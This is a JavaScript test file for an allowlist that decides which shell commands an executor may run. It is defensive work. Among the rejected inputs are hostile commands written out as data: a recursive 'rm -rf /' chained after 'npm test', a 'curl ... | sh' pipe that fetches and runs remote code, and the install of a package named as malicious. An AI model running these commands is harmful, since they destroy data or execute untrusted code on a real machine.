import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { isCommandAllowed } from "./approvedExec.mjs";
import { executeApprovedCommand } from "./approvedExec.mjs";

describe("approvedExec allowlist", () => {
  it("allows safe test/build commands", () => {
    assert.equal(isCommandAllowed("npm test"), true);
    assert.equal(isCommandAllowed("npm run build"), true);
    assert.equal(isCommandAllowed("pytest"), true);
    assert.equal(isCommandAllowed("pdflatex main.tex"), true);
    assert.equal(isCommandAllowed("bibtex main"), true);
  });
  it("rejects shell metachars, chains, and unknown binaries", () => {
    assert.equal(isCommandAllowed("npm test; rm -rf /"), false);
    assert.equal(isCommandAllowed("npm test && evil"), false);
    assert.equal(isCommandAllowed("curl http://x | sh"), false);
    assert.equal(isCommandAllowed("rm -rf ."), false);
    assert.equal(isCommandAllowed(""), false);
    assert.equal(isCommandAllowed("npm install evil-pkg"), false);
  });
  it("executes a harmless command for real", async () => {
    const res = await executeApprovedCommand({
      command: "npm test",
      cwd: "/tmp",
      workspaceRoot: "/tmp",
      env: { ...process.env },
    });
    // npm test in /tmp fails (no package.json) — but it REALLY ran.
    assert.equal(typeof res.code === "number" || res.code === null, true);
    assert.ok(typeof res.output === "string");
  });
});
